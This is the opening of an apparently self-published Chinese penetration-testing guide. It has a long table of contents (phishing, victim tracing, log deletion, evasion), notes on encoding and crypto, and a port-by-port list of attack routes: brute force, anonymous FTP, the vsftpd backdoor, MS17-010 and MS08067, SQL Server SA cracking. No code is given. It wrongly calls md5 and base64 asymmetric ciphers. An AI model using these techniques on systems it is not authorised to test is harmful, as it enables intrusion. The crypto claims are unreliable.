
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515191227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

@[toc]

- [写在前面](#写在前面)
- [准备工作](#准备工作)
  - [虚拟机系统配置](#虚拟机系统配置)
    - [配置上网](#配置上网)
  - [基本常见知识点](#基本常见知识点)
    - [编码](#编码)
      - [URL编码](#url编码)
      - [Base64](#base64)
    - [密码学和编码](#密码学和编码)
      - [用在哪里](#用在哪里)
      - [分辨是什么类型的](#分辨是什么类型的)
      - [解密](#解密)
      - [工具介绍](#工具介绍)
  - [同源策略](#同源策略)
  - [术语](#术语)
    - [CORS、 CSP](#cors-csp)
    - [日志分析](#日志分析)
    - [请求协议](#请求协议)
    - [端口](#端口)
      - [常见端口](#常见端口)
    - [蜜罐](#蜜罐)
      - [OSI七层协议](#osi七层协议)
      - [UDP](#udp)
      - [TCP](#tcp)
      - [DHCP协议](#dhcp协议)
      - [路由算法](#路由算法)
    - [DNS](#dns)
      - [DNS基础](#dns基础)
      - [相关漏洞](#相关漏洞)
        - [DDoS 攻击](#ddos-攻击)
        - [DNS劫持](#dns劫持)
        - [DNS中毒](#dns中毒)
      - [邮件协议族](#邮件协议族)
      - [邮件安全协议](#邮件安全协议)
    - [HTTP/HTTPS基础知识](#httphttps基础知识)
        - [cookie含义](#cookie含义)
      - [访问类型](#访问类型)
      - [状态码](#状态码)
    - [代理](#代理)
    - [操作系统](#操作系统)
      - [Linux](#linux)
        - [更新安装列表](#更新安装列表)
        - [压缩](#压缩)
      - [centos](#centos)
      - [Ubuntu](#ubuntu)
    - [待完善：编程语言](#待完善编程语言)
      - [PYTHON](#python)
      - [JAVASCRIPT](#javascript)
      - [JAVA](#java)
      - [PHP](#php)
      - [C](#c)
    - [Web容器分类](#web容器分类)
    - [数据库](#数据库)
      - [关系型](#关系型)
        - [关系型数据库代表](#关系型数据库代表)
          - [access](#access)
          - [mysql](#mysql)
      - [非关系型](#非关系型)
        - [非关系型数据库代表](#非关系型数据库代表)
    - [开源渗透测试标准](#开源渗透测试标准)
    - [Linux](#linux-1)
      - [常见有用命令](#常见有用命令)
    - [windows](#windows)
      - [windows 不同系统](#windows-不同系统)
        - [win10特殊功能](#win10特殊功能)
      - [windows 常见命令](#windows-常见命令)
- [信息收集](#信息收集)
  - [待完善：我的搜集流程](#待完善我的搜集流程)
    - [网站](#网站)
  - [信息搜集开源项目](#信息搜集开源项目)
  - [github监控](#github监控)
  - [web组成框架信息收集](#web组成框架信息收集)
    - [源代码](#源代码)
    - [操作系统](#操作系统-1)
    - [中间件](#中间件)
  - [被动信息收集](#被动信息收集)
  - [学会用搜索引擎](#学会用搜索引擎)
  - [源码层面收集](#源码层面收集)
    - [响应头](#响应头)
    - [CMS识别](#cms识别)
    - [github监控](#github监控-1)
  - [主动信息收集](#主动信息收集)
    - [拓展信息收集](#拓展信息收集)
      - [子域名收集](#子域名收集)
        - [方法一：爆破子域名](#方法一爆破子域名)
        - [方法二：旁站搜集](#方法二旁站搜集)
        - [方法三：证书](#方法三证书)
    - [获取路径](#获取路径)
      - [目录爆破](#目录爆破)
        - [目录爆破经验](#目录爆破经验)
        - [图像](#图像)
        - [阻塞遍历序列](#阻塞遍历序列)
      - [手工目录爆破](#手工目录爆破)
      - [工具](#工具)
- [工具](#工具-1)
  - [字典](#字典)
  - [学会上网](#学会上网)
    - [google hack](#google-hack)
    - [暗网](#暗网)
    - [空间搜索引擎](#空间搜索引擎)
      - [Shodan](#shodan)
      - [钟馗之眼](#钟馗之眼)
      - [FoFa搜索引擎](#fofa搜索引擎)
      - [Dnsdb搜索引擎](#dnsdb搜索引擎)
  - [邮件](#邮件)
    - [Swaks](#swaks)
  - [抓包](#抓包)
    - [进程装包](#进程装包)
    - [手机抓包](#手机抓包)
    - [爬整个网站](#爬整个网站)
  - [HTTrack](#httrack)
  - [DNS信息收集](#dns信息收集)
    - [dig](#dig)
    - [nslookup](#nslookup)
    - [hash相關工具](#hash相關工具)
      - [识别](#识别)
      - [破解](#破解)
        - [john](#john)
        - [hashcat](#hashcat)
    - [后门管理工具](#后门管理工具)
    - [邮箱信息](#邮箱信息)
      - [搜集](#搜集)
      - [验证是否被弃用](#验证是否被弃用)
  - [综合工具](#综合工具)
    - [信息搜集](#信息搜集)
      - [电子邮件](#电子邮件)
      - [theHarvester](#theharvester)
      - [sparta](#sparta)
    - [帮助手动测试](#帮助手动测试)
      - [hackbar](#hackbar)
      - [nmap](#nmap)
      - [hping3](#hping3)
    - [抓包工具](#抓包工具)
      - [Wireshark](#wireshark)
      - [BurpSuite](#burpsuite)
        - [插件](#插件)
    - [漏洞扫描工具](#漏洞扫描工具)
      - [Awvs](#awvs)
      - [AppScan](#appscan)
      - [kali](#kali)
      - [安装kali](#安装kali)
        - [Metasploit](#metasploit)
        - [拿到shell后](#拿到shell后)
          - [windows](#windows-1)
    - [网站](#网站-1)
- [web安全](#web安全)
- [待补充：系统：攻击](#待补充系统攻击)
  - [经典漏洞](#经典漏洞)
    - [永恒之蓝](#永恒之蓝)
- [第三方攻击](#第三方攻击)
- [web:攻击](#web攻击)
- [APP封装](#app封装)
  - [中间件漏洞](#中间件漏洞)
    - [资源推荐](#资源推荐)
  - [请求数据包漏洞](#请求数据包漏洞)
  - [社会工程学](#社会工程学)
    - [套话](#套话)
      - [社交媒体](#社交媒体)
    - [钓鱼](#钓鱼)
      - [钓鱼 wifi](#钓鱼-wifi)
        - [鱼叉攻击](#鱼叉攻击)
      - [水坑攻击](#水坑攻击)
      - [钓鱼邮件](#钓鱼邮件)
      - [钓鱼技巧](#钓鱼技巧)
    - [定向社工](#定向社工)
  - [如何在本地查询](#如何在本地查询)
  - [中间人攻击](#中间人攻击)
  - [反序列化（对象注入）](#反序列化对象注入)
    - [PHP序列化与反序列化](#php序列化与反序列化)
  - [重放攻击](#重放攻击)
  - [html 注入](#html-注入)
  - [下载漏洞](#下载漏洞)
  - [文件操作](#文件操作)
    - [文件包含](#文件包含)
      - [本地文件包含](#本地文件包含)
      - [远程协议包含](#远程协议包含)
      - [何种协议流玩法](#何种协议流玩法)
      - [防御](#防御)
    - [文件下载](#文件下载)
    - [文件上传漏洞](#文件上传漏洞)
      - [执行](#执行)
        - [明確只能上传图片](#明確只能上传图片)
        - [+解析漏洞](#解析漏洞)
        - [+文件包含漏洞](#文件包含漏洞)
        - [+ IIS6.0上传漏洞](#-iis60上传漏洞)
        - [+ Apache解析漏洞-低版本2.X](#-apache解析漏洞-低版本2x)
        - [+Apache2.4.0-2.4.29换行解析](#apache240-2429换行解析)
        - [待补充： +weblogic](#待补充-weblogic)
        - [+firecms上传漏洞](#firecms上传漏洞)
        - [待补充：+CVE-2017-12615:tomcat任意文件上传](#待补充cve-2017-12615tomcat任意文件上传)
        - [+竞态](#竞态)
        - [编辑器](#编辑器)
        - [常规上传](#常规上传)
  - [逻辑越权](#逻辑越权)
    - [越权](#越权)
      - [水平越权](#水平越权)
      - [垂直越权](#垂直越权)
      - [待补充：工具](#待补充工具)
      - [防御](#防御-1)
    - [登录脆弱](#登录脆弱)
      - [登陆点暴力破解](#登陆点暴力破解)
        - [什么网站登录点可以进行暴力破解](#什么网站登录点可以进行暴力破解)
        - [准备字典](#准备字典)
        - [暴力破解](#暴力破解)
        - [其他登陆点攻击](#其他登陆点攻击)
  - [CRLF 注入](#crlf-注入)
  - [宽字节注入](#宽字节注入)
  - [XXE](#xxe)
    - [学习资料](#学习资料)
    - [XXE 基础](#xxe-基础)
    - [XXE 攻击](#xxe-攻击)
      - [远程文件 SSRF](#远程文件-ssrf)
      - [XXE 亿笑攻击-DOS](#xxe-亿笑攻击-dos)
  - [RCE（远程命令执行）](#rce远程命令执行)
    - [实例：网站可执行系统命令](#实例网站可执行系统命令)
  - [数据库注入](#数据库注入)
    - [基本知识](#基本知识)
    - [制造回显](#制造回显)
      - [报错回显](#报错回显)
        - [bool类型注入](#bool类型注入)
          - [制作布尔查询](#制作布尔查询)
        - [时间SQL注入](#时间sql注入)
          - [制作时间SQL注入](#制作时间sql注入)
          - [其他数据库的时间注入](#其他数据库的时间注入)
    - [使用万能密码对登录页注入](#使用万能密码对登录页注入)
      - [用户名不存在](#用户名不存在)
      - [1. 判断是否存在注入点](#1-判断是否存在注入点)
      - [2. 判断列数](#2-判断列数)
      - [3. 信息搜集](#3-信息搜集)
    - [sql注入过程：手工/sqlmap](#sql注入过程手工sqlmap)
      - [tamper 自定义](#tamper-自定义)
      - [注入插件脚本编写](#注入插件脚本编写)
    - [跨域连接](#跨域连接)
    - [文件读取与写入](#文件读取与写入)
    - [SQL注入常见防御](#sql注入常见防御)
    - [绕过防御](#绕过防御)
      - [IP白名单](#ip白名单)
      - [静态资源](#静态资源)
      - [爬虫白名单](#爬虫白名单)
      - [版本绕过](#版本绕过)
      - [空白](#空白)
      - [空字节](#空字节)
      - [网址编码](#网址编码)
      - [十六进制编码（HEX）](#十六进制编码hex)
      - [字符编码](#字符编码)
      - [字符串连接](#字符串连接)
      - [注释](#注释)
      - [组合](#组合)
      - [二次注入](#二次注入)
    - [注入拓展](#注入拓展)
      - [dnslog带外注入](#dnslog带外注入)
      - [json格式数据包](#json格式数据包)
      - [insert 注入](#insert-注入)
      - [加密参数](#加密参数)
      - [堆叠查询注入](#堆叠查询注入)
      - [cookie 注入](#cookie-注入)
  - [xss攻击](#xss攻击)
      - [反射型](#反射型)
      - [持久型](#持久型)
      - [DOM型](#dom型)
    - [待补充：fuzz](#待补充fuzz)
    - [XSStrike](#xsstrike)
    - [xss平台](#xss平台)
      - [使用](#使用)
    - [XSS其他工具推荐](#xss其他工具推荐)
    - [beef-xss](#beef-xss)
    - [self-xss](#self-xss)
    - [防御与绕过](#防御与绕过)
      - [httponly](#httponly)
      - [常见防御](#常见防御)
      - [常见绕过](#常见绕过)
    - [XSS注入过程](#xss注入过程)
  - [CSRF](#csrf)
    - [实战](#实战)
    - [防御](#防御-2)
  - [SSRF](#ssrf)
    - [常见攻击演示](#常见攻击演示)
      - [图片上传](#图片上传)
  - [短信轰炸](#短信轰炸)
    - [单个用户](#单个用户)
    - [轮询用户](#轮询用户)
  - [邮箱/短信轰炸](#邮箱短信轰炸)
  - [DDOS 攻击](#ddos-攻击-1)
    - [攻击过程](#攻击过程)
      - [DDOS 攻击手段](#ddos-攻击手段)
      - [利用Nmap完成DDos攻击](#利用nmap完成ddos攻击)
  - [待补充：DNS劫持](#待补充dns劫持)
  - [待补充：ARP欺骗](#待补充arp欺骗)
  - [密码](#密码)
- [待补充：侦查](#待补充侦查)
  - [待补充： 日志审计](#待补充-日志审计)
- [经验积累](#经验积累)
  - [待补充:第三方软件漏洞](#待补充第三方软件漏洞)
    - [weblogic漏洞](#weblogic漏洞)
  - [待重点完善：语言漏洞](#待重点完善语言漏洞)
  - [待重点完善：中间件](#待重点完善中间件)
  - [待重点完善：CVE](#待重点完善cve)
  - [待重点完善：WAF绕过](#待重点完善waf绕过)
    - [基本知识](#基本知识-1)
    - [WAF经验](#waf经验)
    - [通用](#通用)
      - [躲避流量监控](#躲避流量监控)
    - [SQL绕过](#sql绕过)
    - [安全狗绕过](#安全狗绕过)
      - [默认未开启的防御绕过](#默认未开启的防御绕过)
    - [文件上传绕过](#文件上传绕过)
      - [安全狗](#安全狗)
    - [xss 绕过](#xss-绕过)
  - [待补充：0day漏洞](#待补充0day漏洞)
  - [代理](#代理-1)
  - [非正常页面渗透](#非正常页面渗透)
    - [403/404/nginx](#403404nginx)
  - [验证码攻破](#验证码攻破)
    - [验证码](#验证码)
      - [](#)
        - [双因子绕过](#双因子绕过)
    - [打码平台](#打码平台)
    - [待补充：机器学习](#待补充机器学习)
  - [批量刷漏洞](#批量刷漏洞)
    - [盲攻击](#盲攻击)
    - [攻破类似网站](#攻破类似网站)
      - [如何攻击更多人](#如何攻击更多人)
    - [一句话木马](#一句话木马)
      - [php](#php-1)
  - [密码](#密码-1)
    - [windows密码获取和破解](#windows密码获取和破解)
    - [Linux密码获取和破解](#linux密码获取和破解)
  - [后渗透](#后渗透)
    - [后渗透收集内网信息](#后渗透收集内网信息)
    - [提权、渗透内网、永久后门。](#提权渗透内网永久后门)
  - [感染](#感染)
  - [费时：全方位挖掘策略](#费时全方位挖掘策略)
  - [信息收集](#信息收集-1)
    - [源码分析](#源码分析)
    - [获得shell后信息收集](#获得shell后信息收集)
    - [溯源](#溯源)
      - [很强大的溯源工具](#很强大的溯源工具)
      - [已知名字](#已知名字)
      - [已知邮箱](#已知邮箱)
        - [获取电话号码](#获取电话号码)
      - [网站信息查询](#网站信息查询)
      - [IP 定位](#ip-定位)
      - [已知电话号码](#已知电话号码)
        - [查询社交账号](#查询社交账号)
      - [社交账号](#社交账号)
        - [查询照片EXIF](#查询照片exif)
      - [已知QQ号](#已知qq号)
        - [查询地址](#查询地址)
        - [查询电话号](#查询电话号)
        - [加被害者](#加被害者)
      - [社工库](#社工库)
  - [绕过CDN](#绕过cdn)
  - [WAF](#waf)
  - [待补充：横向渗透](#待补充横向渗透)
  - [待补充：提权](#待补充提权)
    - [windows](#windows-2)
  - [批量刷漏洞](#批量刷漏洞-1)
- [待补充：实战经验](#待补充实战经验)
  - [拿到一个网站需测试](#拿到一个网站需测试)
  - [网站raw修改](#网站raw修改)
    - [cookie](#cookie)
  - [爆破情况](#爆破情况)
  - [网站回显](#网站回显)
  - [漏洞易发现模块](#漏洞易发现模块)
    - [后台登录页面](#后台登录页面)
    - [登录框](#登录框)
    - [密码修改](#密码修改)
    - [用户注册](#用户注册)
    - [发送邮件/电话号码短信](#发送邮件电话号码短信)
    - [windows 入侵检查](#windows-入侵检查)
    - [linux 入侵检查](#linux-入侵检查)
    - [如何发现隐藏的 Webshell 后门](#如何发现隐藏的-webshell-后门)
  - [待补充：后门](#待补充后门)
    - [后门中的后门](#后门中的后门)
    - [后门软件](#后门软件)
      - [远程控制](#远程控制)
        - [Quasar](#quasar)
- [待补充，可能不要这一小节：技巧](#待补充可能不要这一小节技巧)
  - [HTTP 参数污染](#http-参数污染)
- [隐藏技术](#隐藏技术)
  - [实用工具](#实用工具)
    - [匿名工具](#匿名工具)
  - [免杀](#免杀)
  - [持久化](#持久化)
    - [防止掉入蜜罐](#防止掉入蜜罐)
  - [匿名代理纯净的渗透环境](#匿名代理纯净的渗透环境)
    - [日志删除](#日志删除)
    - [使用tor网络](#使用tor网络)
    - [将流量隐藏于合法流量中](#将流量隐藏于合法流量中)
    - [修改来源于类型](#修改来源于类型)
    - [获得 Shell后](#获得-shell后)
      - [进程迁移](#进程迁移)
      - [系统命令](#系统命令)
- [下一步](#下一步)
  - [自学](#自学)
    - [文档](#文档)
    - [视频](#视频)
  - [如何赚钱](#如何赚钱)
    - [当老师](#当老师)
  - [刷题](#刷题)
  - [工具社区](#工具社区)
  - [知名机构](#知名机构)
  - [社区](#社区)
    - [黑客组织和官网](#黑客组织和官网)
  - [期刊](#期刊)
  - [大会](#大会)
  - [导航](#导航)
  - [大佬博客](#大佬博客)
  - [赏金平台/SRC](#赏金平台src)
  - [图书推荐](#图书推荐)
  - [博客](#博客)
  - [其他资源](#其他资源)
  - [如何修成](#如何修成)
    - [待补充：如何发现0day漏洞](#待补充如何发现0day漏洞)
      - [成为什么样的人](#成为什么样的人)
      - [让自己小有名气](#让自己小有名气)
        - [写书](#写书)
    - [更多阅读](#更多阅读)
  - [待补充：寻求交流社区](#待补充寻求交流社区)

# 写在前面

**作者：洪七**

**qq交流群：942443861**

文章链接：https://github.com/ngadminq/Hong-Qigong-penetration-test-guide

本文开始于2021/4/27
预计2022年完成



****
*待补充：简要介绍每一章节讲了什么，应该如何阅读、学习*

*待补充：每一种漏洞介绍经验，常见什么形式展现，从源码层面做分析*

*将每种类型常见的公开漏洞做总结*

*将文章拆分为：原理版和实践版*

# 准备工作





## 虚拟机系统配置

### 配置上网


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515003648812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## 基本常见知识点

### 编码

#### URL编码

互联网只接受 ASCII 格式的 URL，URL 编码需要对 URL 字符集的某些部分进行编码。此过程将一个字符转换为一个字符三元组，其前缀为“%”，后跟两个十六进制格式的数字。

#### Base64

用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。同样以“https://mp.toutiao.com”头条号主页地址为例，经过Base64编码后结果如下图所示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521203026938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 密码学和编码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628202441986.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603154257943.png)



#### 用在哪里

时间戳:网站源码通常不会直接显示比如2021/6/28而是会转换为时间戳的形式

#### 分辨是什么类型的
密码学的对称密码与非对称密码有哪些
 -- 对称：DES、3DES、AES等
 -- 非对称：md5、base64等


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628204319808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
如何分辨base64【主要应用在web中用于对源码的加密或者用户名或者密码的加密】
长度一定会被4整除
很多都以等号结尾(为了凑齐所以结尾用等号)，当然也存在没有等号的base64
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628205659976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628210715235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
md5:任意长度的数据，算出的MD5值长度都是固定的，一般是32位也有16位。由数字大小写混成。密文中字母大小写不会影响破解结果

**AES**
AES最重要的是在base64基础上增加了两个参数即：密码和偏移；现在很多CTF也会有AES编码的题的，但都是给了这两个参数的值，不给的话神仙也解不出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628212205816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

HEX编码
HEX编码又叫十六进制编码，是数据的16进制表达形式，是计算机中数据的一种表示方法。同我们日常中的十进制表示法不一样。它由0-9，A-F组成。与10进制的对应关系是：0-9对应0-9，A-F对应10-15。同样以“https://mp.toutiao.com”头条号主页地址为例，经过HEX编码后结果如下图所示：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210521203017826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


密钥：如果加密密钥和解密密钥相同，那么这种密码算法叫做对称密码算法，这个比较好理解，符合正常的逻辑，一把钥匙对一把锁嘛；另外一类，正好相反，也就是加密密钥和解密密钥不相同，这种密码算法叫做非对称密码算法，也叫公钥密码算法，




#### 解密

md5是使用最广的一种hash算法，这种算法是不可逆的。
sha1已经完全被破解，具体参考王小云
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628203420927.png)

#### 工具介绍

加密工具
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628202608911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
解密工具
一些网站研究出了算法来允许破解md5比如cmd5，你获取到如下数据库密码时，你可以注意到这个密码还采用了salt加盐，因此你在使用cmd5时应注意调参
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210628225351540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 同源策略

 解释一下，何为同源：协议、域名、端口都一样就是同源
 ~ http、https、 
 ~ a.com、b.com
 ~ url:80、url:90

## 术语

**旁站入侵**
即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等

**C段入侵**
即同C段下服务器入侵。如目标ip为192.168.180.253 入侵192.168.180.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit, Snoop, Tcpdump, Dsniff 等。




### CORS、 CSP

### 日志分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210517141434746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 请求协议

IPv4 数据包 Headers 的细节

### 端口

#### 常见端口

有些端口漏洞利用方式我没有详细列出，补充链接为https://websec.readthedocs.io/zh/latest/info/port.html
**FTP:20/21**
ftp的端口号20、21的区别一个是数据端口，一个是控制端口，控制端口一般为21
当你发现ip开放21端口，你可以在cmd中输入ftp ip查看是否能访问
默认用户名密码 anonymous:anonymous

FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。这里剖析渗透FTP服务器的几种方法。

>（1）基础爆破：ftp爆破工具很多，这里我推owasp的Bruter,hydra以及msf中的ftp爆破模块。
>（2) ftp匿名访问：用户名：anonymous 密码：为空或者任意邮箱
>（3）后门vsftpd ：version 2到2.3.4存在后门漏洞，攻击者可以通过该漏洞获取root权限。（https://www.freebuf.com/column/143480.html）
>（4）嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）,使用Cain进行渗透。
>（5）ftp远程代码溢出。（https://blog.csdn.net/weixin_42214273/article/details/82892282）（6）ftp跳转攻击。（https://blog.csdn.net/mgxcool/article/details/48249473）


暴力破解密码
VSFTP某版本后门
**SSH：22**
SSH 是协议，通常使用 OpenSSH 软件实现协议应用。SSH 为 Secure Shell 的缩写，由 IETF 的网络工作小组（Network Working Group）所制定；SSH 为建立在应用层和传输层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其它网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。

>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。
>（2）防火墙SSH后门。（https://www.secpulse.com/archives/69093.html）
>（3）28退格 OpenSSL
>（4）openssh 用户枚举 CVE-2018-15473。（https://www.anquanke.com/post/id/157607）

**23 Telnet**
telnet是一种旧的远程管理方式，使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的，黑客可使用嗅探技术截获到此类密码。

>（1）暴力破解技术是常用的技术，使用hydra,或者msf中telnet模块对其进行破解。
>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。

**smtp：25/465**
smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件

>默认端口：25（smtp）、465（smtps）
>（1）爆破：弱口令
>（2）未授权访问

**53**
53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。

>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。
>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（https://www.seebug.org/vuldb/ssvid-96718）
>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https://baijiahao.baidu.com/s?id=1577362432987749706&wfr=spider&for=pc）
>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（http://www.edu.cn/xxh/fei/zxz/201503/t20150305_1235269.shtml）
>（4）DNS劫持。（https://blog.csdn.net/qq_32447301/article/details/77542474）


**web:80**
80端口通常提供web服务。目前黑客对80端口的攻击典型是采用SQL注入的攻击方法，脚本渗透技术也是一项综合性极高的web渗透技术，同时脚本渗透技术对80端口也构成严重的威胁。
（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。
（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。
（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。
（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。
（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。
（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。
（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。


135端口主要用于使用RPC协议并提供DCOM服务，通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接进行通信，能够跨包括HTTP协议在内的多种网络传输。同时这个端口也爆出过不少漏洞，最严重的就是缓冲区溢出漏洞，曾经疯狂一时的‘冲击波’病毒就是利用这个漏洞进行传播的。对于135端口的渗透，黑客的渗透方法为:

>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。（https://wenku.baidu.com/view/68b3340c79563c1ec5da710a.html）
>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用hydra。对于telnet服务的开启可使用工具kali链接。（https://wenku.baidu.com/view/c8b96ae2700abb68a982fbdf.html）


**139/445**
445 SMB     ms17-010永恒之蓝
139端口是为‘NetBIOS SessionService’提供的，主要用于提供windows文件和打印机共享以及UNIX中的Samba服务。445端口也用于提供windows文件和打印机共享，在内网环境中使用的很广泛。这两个端口同样属于重点攻击对象，139/445端口曾出现过许多严重级别的漏洞。下面剖析渗透此类端口的基本思路。

>（1）对于开放139/445端口的主机，一般尝试利用溢出漏洞对远程主机进行溢出攻击，成功后直接获得系统权限。利用msf的ms-017永恒之蓝。（https://blog.csdn.net/qq_41880069/article/details/82908131）
>（2）对于攻击只开放445端口的主机，黑客一般使用工具‘MS06040’或‘MS08067’.可使用专用的445端口扫描器进行扫描。NS08067溢出工具对windows2003系统的溢出十分有效，工具基本使用参数在cmd下会有提示。（https://blog.csdn.net/god_7z1/article/details/6773652）
>（3）对于开放139/445端口的主机，黑客一般使用IPC$进行渗透。在没有使用特点的账户和密码进行空连接时，权限是最小的。获得系统特定账户和密码成为提升权限的关键了，比如获得administrator账户的口令。（https://blog.warhut.cn/dmbj/145.html）
>（4）对于开放139/445端口的主机，可利用共享获取敏感信息，这也是内网渗透中收集信息的基本途径。

**1433 MSSQL**
1433是SQLServer默认的端口，SQL Server服务使用两个端口：tcp-1433、UDP-1434.其中1433用于供SQLServer对外提供服务，1434用于向请求者返回SQLServer使用了哪些TCP/IP端口。1433端口通常遭到黑客的攻击，而且攻击的方式层出不穷。最严重的莫过于远程溢出漏洞了，如由于SQL注射攻击的兴起，各类数据库时刻面临着安全威胁。利用SQL注射技术对数据库进行渗透是目前比较流行的攻击方式，此类技术属于脚本渗透技术。

>（1）对于开放1433端口的SQL Server2000的数据库服务器，黑客尝试使用远程溢出漏洞对主机进行溢出测试，成功后直接获得系统权限。（https://blog.csdn.net/gxj022/article/details/4593015）
>（2）暴力破解技术是一项经典的技术。一般破解的对象都是SA用户。通过字典破解的方式很快破解出SA的密码。（https://blog.csdn.net/kali_linux/article/details/50499576）
>（3）嗅探技术同样能嗅探到SQL Server的登录密码。
>（4）由于脚本程序编写的不严密，例如，程序员对参数过滤不严等，这都会造成严重的注射漏洞。通过SQL注射可间接性的对数据库服务器进行渗透，通过调用一些存储过程执行系统命令。可以使用SQL综合利用工具完成。


**1521 Oracle **

1521是大型数据库Oracle的默认监听端口，估计新手还对此端口比较陌生，平时大家接触的比较多的是Access，MSSQL以及MYSQL这三种数据库。一般大型站点才会部署这种比较昂贵的数据库系统。对于渗透这种比较复杂的数据库系统，黑客的思路如下：

